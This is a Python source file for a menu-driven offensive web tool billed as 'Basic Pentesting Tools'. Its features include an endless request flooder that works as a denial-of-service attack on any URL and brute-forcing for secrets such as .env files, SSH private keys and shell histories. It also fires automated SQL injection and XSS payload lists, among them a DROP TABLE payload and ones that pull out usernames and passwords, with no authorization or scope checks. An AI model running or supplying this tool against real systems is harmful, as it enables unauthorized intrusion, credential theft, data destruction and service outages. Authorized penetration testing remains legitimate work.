import aiohttp
import asyncio
import socket
import ssl
from urllib.parse import urljoin, urlparse
import os

def display_banner():
    print("""
#####    #######  ##   ##   #####   ##   ##  #######  ######   
 ## ##    ##   #  ##   ##  ### ###  ##   ##   ##   #   ##  ##  
 ##  ##   ##      ##   ##  ##   ##  ##   ##   ##       ##  ##  
 ##  ##   ####     ## ##   ##   ##   ## ##    ####     #####   
 ##  ##   ##       ## ##   ##   ##   ## ##    ##       ## ##   
 ## ##    ##   #    ###    ### ###    ###     ##   #   ## ##   
#####    #######    ###     #####     ###    #######  #### ##   V4.2

 \033[1;32m+ -- -- +=[ Author: kdandy | Repo: https://github.com/kdandy/devtools\033[1;m
 \033[1;32m+ -- -- +=[ Basic Pentesting Tools \033[1;m
    """)

def display_menu():
    print("\nSelect the features you want to run:")
    print("1. Search for subdomains")
    print("2. Spam GET requests to target URL")
    print("3. Full Port Scan")
    print("4. Directory and Sensitive File Bruteforcing")
    print("5. SQL Injection Testing")
    print("6. XSS Testing")
    print("7. Header and SSL/TLS Inspection")
    choice = input("Enter options (1-7): ")
    return choice

def url_validator(url):
    """Validate if URL has a correct scheme."""
    parsed = urlparse(url)
    return parsed.scheme in ('http', 'https')

# Ensure output directory exists
os.makedirs("output", exist_ok=True)

async def fetch_subdomains(domain):
    crt_sh_url = f"https://crt.sh/?q=%25.{domain}&output=json"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(crt_sh_url) as response:
                if response.status == 200:
                    data = await response.json()
                    subdomains = {entry['name_value'] for entry in data}
                    print("\nFound subdomains:")
                    for subdomain in subdomains:
                        print(subdomain)
                    
                    with open("output/findsub.text", "w") as file:
                        file.write("\n".join(subdomains))
                    
                    print("\nSubdomains saved to output/findsub.text")
                else:
                    print(f"Failed to access crt.sh. Status code: {response.status}")
        except Exception as e:
            print(f"Error: {e}")

async def spam_get_requests(url, requests_per_batch):
    if not url_validator(url):
        print("Invalid URL. Please include http:// or https://")
        return
    async with aiohttp.ClientSession() as session:
        while True:
            tasks = [send_single_get_request(session, url) for _ in range(requests_per_batch)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0)

async def send_single_get_request(session, url):
    try:
        async with session.get(url) as response:
            print(f"Accessed {url} with status {response.status}")
    except Exception as e:
        print(f"Error accessing {url}: {e}")

def full_port_scan(domain):
    print("\nScanning all ports (1-65535)...")
    ip = socket.gethostbyname(domain)
    open_ports = []
    for port in range(1, 65536):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.3)
        if sock.connect_ex((ip, port)) == 0:
            print(f"Port {port} is open on {domain}")
            open_ports.append(port)
        sock.close()
    
    if open_ports:
        with open("output/open_ports.txt", "w") as file:
            file.write(f"Open ports on {domain}:\n" + "\n".join(map(str, open_ports)))
        print("\nOpen ports saved to output/open_ports.txt")
    else:
        print("\nNo open ports found.")

async def bruteforce_directories_and_sensitive_files(url):
    if not url_validator(url):
        print("Invalid URL. Please include http:// or https://")
        return
    
    directories_and_files = [
        "admin", "administrator", "dashboard", "config", "configs", "conf", "backup", "backups", "upload", "uploads",
        "private", "data", "database", "db", "log", "logs", "temp", "tmp", "cache", "debug", "include", "includes",
        "lib", "libs", "modules", "cgi-bin", "public", "files", "assets", "static", "src", "source", "environment",
        "env", "staging", "test", "tests", "sample", "samples", "dev", "development", "examples", "docs", "documentation",
        ".env", ".htaccess", ".git/", ".gitignore", ".npmrc", ".bash_history", ".zsh_history", "settings.py", "config.py",
        "config.json", "config.yaml", "config.yml", "database.sql", "db.sql", "db_backup.sql", "backup.sql", "secrets.json",
        "secret.key", "private.key", "server.key", "id_rsa", "id_rsa.pub", "docker-compose.yml", "Dockerfile",
        "wp-config.php", "local_settings.py", "web.config", "application.yml", "application.yaml", "parameters.yml",
        "parameters.yaml", "composer.json", "composer.lock", "package.json", "package-lock.json", "yarn.lock",
        "Pipfile", "Pipfile.lock", "requirements.txt", "Gemfile", "Gemfile.lock", "Makefile", "Procfile", "Rakefile",
        "error.log", "access.log", "debug.log", "install.log", "system.log", "error_log", "apache.log", "nginx.log",
        "mysql_error.log", "php_error.log", "install.log", "setup.log", "database.log", "debug.log",
        "backup.zip", "backup.tar.gz", "backup.tar", "site_backup.zip", "db_backup.zip", "database_backup.zip",
        "backup.bak", "backup_old.tar.gz", "old_backup.zip", "data_backup.zip", "site-backup.tar.gz", "config_backup.tar",
        "project_backup.tar", "app_backup.tar", "backup.sql.gz", "backup.sql.zip", "backup_db.tar.gz",
        "sitemap.xml", "sitemap_index.xml", "phpinfo.php", "readme.md", "README.txt", "LICENSE", "CHANGELOG.md",
        "CHANGELOG.txt", "UPGRADE.txt", "INSTALL.txt", "VERSION", "todo.txt", "TODO.md", "notes.txt", "NOTES.md",
        "help.md", "help.txt", "CONTRIBUTING.md", "AUTHORS", "SECURITY.md", "policy.md", "robots.txt",
        "site.xml", "rss.xml", "feeds.xml", "backup.xml", "env.json", "robots.json", "api_keys.txt", "secrets.txt",
        "authorized_keys", "known_hosts", "ssh_host_rsa_key", "ssh_host_dsa_key", "tls.key", "tls.crt", "cert.pem",
        "privkey.pem", "fullchain.pem", "cacert.pem", "client-cert.pem", "ssl-cert-snakeoil.pem", "server.crt"
    ]
    
    async with aiohttp.ClientSession() as session:
        found_items = []
        for item in directories_and_files:
            test_url = urljoin(url, item)
            try:
                async with session.get(test_url) as response:
                    if response.status == 200:
                        print(f"Found: {test_url}")
                        found_items.append(test_url)
                    else:
                        print(f"No access: {test_url}")
            except Exception as e:
                print(f"Error accessing {test_url}: {e}")
        
        if found_items:
            with open("output/found_items.txt", "w") as file:
                file.write("Found directories and files:\n" + "\n".join(found_items))
            print("\nResults saved to output/found_items.txt")
        else:
            print("\nNo directories or files found.")

async def sql_injection_testing(url):
    if not url_validator(url):
        print("Invalid URL. Please include http:// or https://")
        return

    sql_payloads = [
    "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'='1'#", "' OR 1=1--",
    "' OR 'x'='x", "' OR '1'='1' AND ''='", "'; DROP TABLE users; --", "'; SELECT SLEEP(5); --",
    "' UNION SELECT NULL, NULL, NULL --", "' UNION SELECT username, password FROM users --",
    "' UNION SELECT 1,2,3,4,5--", "' UNION SELECT ALL FROM information_schema.tables --",
    "' UNION SELECT table_name FROM information_schema.tables--", 
    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
    "' AND 1=1--", "' AND 1=2--", "' AND 'a'='a", "' AND 'a'='b", "' AND ASCII(SUBSTRING((SELECT database()),1,1))=97 --",
    "' AND EXISTS(SELECT 1 FROM users WHERE username='admin') --", 
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
    "' OR SLEEP(5)--", "' OR IF(1=1, SLEEP(5), 0)--", "' AND IF((SELECT 'a' FROM users LIMIT 1)='a', SLEEP(5), 0) --",
    "' OR BENCHMARK(1000000,MD5(1))--", "' OR IF(EXISTS(SELECT * FROM users), SLEEP(5), 0) --",
    "' AND IF(LENGTH(database())>0,SLEEP(5),0)--", "' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64, SLEEP(5),0)--",
    "' AND 1=CONVERT(int, (SELECT @@version))--", "' OR 1=CAST((SELECT @@version) AS int)--",
    "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
    "' AND UPDATEXML(1,CONCAT(0x3a,version()),1)--", "' AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT user())))--",
    "' AND IF((SELECT user())='root', SLEEP(5), 0)--", "' AND IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0)--",
    "' AND IF((SELECT LENGTH(password) FROM users WHERE username='admin') > 5, SLEEP(5), 0)--",
    "' OR IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)) = 97, SLEEP(5), 0) --",
    "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)--",
    "' OR EXP(~(SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))--",
    "' UNION SELECT 1, version(), 3--", "' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))abc)--"
    ]

    
    async with aiohttp.ClientSession() as session:
        for payload in sql_payloads:
            test_url = f"{url}{payload}"
            try:
                async with session.get(test_url) as response:
                    print(f"Tested SQL payload {payload} on {test_url} with status {response.status}")
                    content = await response.text()
                    if "syntax error" in content or "SQL" in content:
                        print(f"Potential SQL Injection vulnerability found with payload: {payload}")
            except Exception as e:
                print(f"Error testing SQL payload {payload}: {e}")

async def xss_testing(url):
    if not url_validator(url):
        print("Invalid URL. Please include http:// or https://")
        return

    xss_payloads = [
    # Basic XSS Payloads
    "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>", "'\"><img src=x onerror=alert('XSS')>",

    # Script Injection Variants
    "<script>alert(document.cookie)</script>", "<script>alert('XSS');</script>",
    "<svg onload=alert('XSS')>", "<iframe src=javascript:alert('XSS')>",
    "<video><source onerror=\"javascript:alert('XSS')\">", "<input onfocus=alert('XSS') autofocus>",

    # Event Handler Injection
    "<img src=x onerror=alert('XSS') />", "<img src=x onerror=\"alert('XSS')\" />",
    "<a href='javascript:alert(1)'>Click</a>", "<button onclick=alert('XSS')>Click</button>",
    "<div onmouseover=alert('XSS')>Hover over me!</div>", "<input onblur=alert('XSS')>",
    
    # Encoded XSS Payloads
    "%3Cscript%3Ealert('XSS')%3C%2Fscript%3E", "<svg%20onload=alert('XSS')>",
    "<img%20src%3Dx%20onerror%3Dalert('XSS')>", "<iframe%20src=javascript:alert('XSS')>",
    
    # Attribute-Based Injection
    "<img src=x:alert(1) onerror=eval(src)>", "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>",
    "<body background=\"javascript:alert('XSS')\">", "<object data=\"javascript:alert('XSS')\">",
    
    # Advanced XSS Techniques
    "<details open ontoggle=alert('XSS')>XSS</details>", "<isindex action=javascript:alert('XSS')>",
    "<keygen autofocus onfocus=alert('XSS')>", "<marquee onstart=alert('XSS')>XSS</marquee>",
    "<object type=\"text/html\" data=\"javascript:alert('XSS')\"></object>",
    
    # JavaScript Scheme Injection
    "<a href='javascript:alert(1)'>XSS</a>", "<a href='JaVaScRiPt:alert(1)'>XSS</a>",
    "<iframe src=\"javascript:alert('XSS');\"></iframe>", "<link rel=\"stylesheet\" href=\"javascript:alert('XSS');\">",
    
    # DOM-Based XSS
    "<script>document.write('<img src=x onerror=alert(1)>');</script>",
    "<script>document.body.innerHTML='<img src=x onerror=alert(1)>';</script>",
    "<script>window.location='javascript:alert(1)';</script>", "<script>history.pushState('', '', 'javascript:alert(1)')</script>",
    
    # HTML Injection for Stored XSS
    "<div><iframe src=javascript:alert('XSS')></iframe></div>", "<table background=javascript:alert('XSS')>",
    "<img dynsrc=javascript:alert('XSS')>", "<style>*{background:url('javascript:alert(1)')}</style>",
    "<img src=1 href=1 dynsrc=javascript:alert(1)>",

    # XSS in SVG and XML
    "<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>",
    "<math><mtext></mtext><script>alert('XSS')</script></math>",
    "<xml><script><![CDATA[alert('XSS')]]></script></xml>",
    
    # CSS-Based XSS
    "<style>@import 'javascript:alert(1)';</style>", "<style>body{background:url(\"javascript:alert('XSS')\")}</style>",
    "<style>img[src=\"x\"]{background:url(\"javascript:alert('XSS')\")}</style>",
    
    # Obfuscated XSS Payloads
    "<scr<script>ipt>alert('XSS')</scr<script>ipt>", "<scr<script>ipt>alert(1)//<scr<script>ipt>",
    "<sCrIpt>alert('XSS')</sCrIpt>", "<svg><sCrIpt>alert('XSS')</sCrIpt></svg>",
    
    # JSON and JavaScript Context XSS
    "{\"data\":\"<img src=x onerror=alert(1)>\"}", "<script>const x=\"<img src=x onerror=alert(1)>\";</script>"
    ]
    
    async with aiohttp.ClientSession() as session:
        for payload in xss_payloads:
            test_url = f"{url}?q={payload}"
            try:
                async with session.get(test_url) as response:
                    print(f"Tested XSS payload {payload} on {test_url} with status {response.status}")
                    content = await response.text()
                    if payload in content:
                        print(f"Potential XSS vulnerability found with payload: {payload}")
            except Exception as e:
                print(f"Error testing XSS payload {payload}: {e}")

async def inspect_headers_and_ssl(domain):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(f"https://{domain}") as response:
                print("\nHTTP Headers:")
                for header, value in response.headers.items():
                    print(f"{header}: {value}")
        except Exception as e:
            print(f"Error fetching headers: {e}")
    
    context = ssl.create_default_context()
    with socket.create_connection((domain, 443)) as sock:
        with context.wrap_socket(sock, server_hostname=domain) as ssock:
            cert = ssock.getpeercert()
            print("\nSSL Certificate Information:")
            for key, value in cert.items():
                print(f"{key}: {value}")

async def main():
    display_banner()
    choice = display_menu()

    if choice == "1":
        domain = input("Enter the target domain (e.g., example.com): ")
        await fetch_subdomains(domain)
    elif choice == "2":
        url = input("Enter target URL: ")
        requests_per_batch = int(input("Enter the number of requests per batch: "))
        await spam_get_requests(url, requests_per_batch)
    elif choice == "3":
        domain = input("Enter the target domain for port scan (e.g., example.com): ")
        full_port_scan(domain)
    elif choice == "4":
        url = input("Enter the target URL for directory and sensitive file bruteforcing (e.g., https://example.com/): ")
        await bruteforce_directories_and_sensitive_files(url)
    elif choice == "5":
        url = input("Enter the target URL for SQL Injection testing (e.g., https://example.com/search?q=): ")
        await sql_injection_testing(url)
    elif choice == "6":
        url = input("Enter the target URL for XSS testing (e.g., https://example.com): ")
        await xss_testing(url)
    elif choice == "7":
        domain = input("Enter the target domain for header and SSL/TLS inspection (e.g., example.com): ")
        await inspect_headers_and_ssl(domain)
    else:
        print("Invalid selection.")

try:
    asyncio.run(main())
except KeyboardInterrupt:
    print("The program was terminated by the user.")